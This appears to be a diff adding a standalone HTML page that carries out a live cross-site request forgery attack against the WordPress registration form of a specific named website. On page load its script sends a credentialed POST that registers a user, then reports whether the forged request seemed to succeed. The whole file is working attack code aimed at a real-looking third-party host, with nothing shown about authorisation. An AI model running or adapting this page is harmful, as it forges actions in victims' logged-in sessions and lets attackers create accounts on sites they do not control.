@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF LIVE TEST</title>
+</head>
+<body>
+    <h1>🔴 CSRF LIVE TEST - Admin Session</h1>
+    
+    <div id="status">Testing...</div>
+
+    <script>
+        // TEST 1: Fetch API dengan credentials
+        async function testCSRF() {
+            const status = document.getElementById('status');
+            status.innerHTML = "🚀 Starting CSRF test...";
+            
+            const formData = new URLSearchParams();
+            formData.append('user_login', 'live_csrf_test');
+            formData.append('user_email', 'ofahmewwxvcxczckig@fxavaj.com');
+            formData.append('wp-submit', 'Register');
+
+            try {
+                const response = await fetch('https://rumahtamushofia.my.id/wp-login.php?action=register', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: formData,
+                    credentials: 'include', // SEND COOKIES!
+                    mode: 'cors'
+                });
+
+                status.innerHTML = `📊 Response Status: ${response.status}<br>`;
+                status.innerHTML += `🔗 Response URL: ${response.url}<br>`;
+                status.innerHTML += `🔄 Redirected: ${response.redirected}<br>`;
+                
+                console.log("🔴 FULL RESPONSE:", response);
+                
+                if (response.redirected) {
+                    status.innerHTML += "❌ CSRF FAILED - Got Redirected<br>";
+                    status.innerHTML += `📍 Redirect to: ${response.url}`;
+                } else {
+                    status.innerHTML += "✅ CSRF MAYBE SUCCESS - No Redirect<br>";
+                    status.innerHTML += "📝 Check WordPress admin for user 'live_csrf_test'";
+                }
+
+            } catch (error) {
+                status.innerHTML = `❌ Error: ${error}`;
+                console.error("CSRF Error:", error);
+            }
+        }
+
+        // Auto-run test
+        testCSRF();
+    </script>
+</body>
+</html>
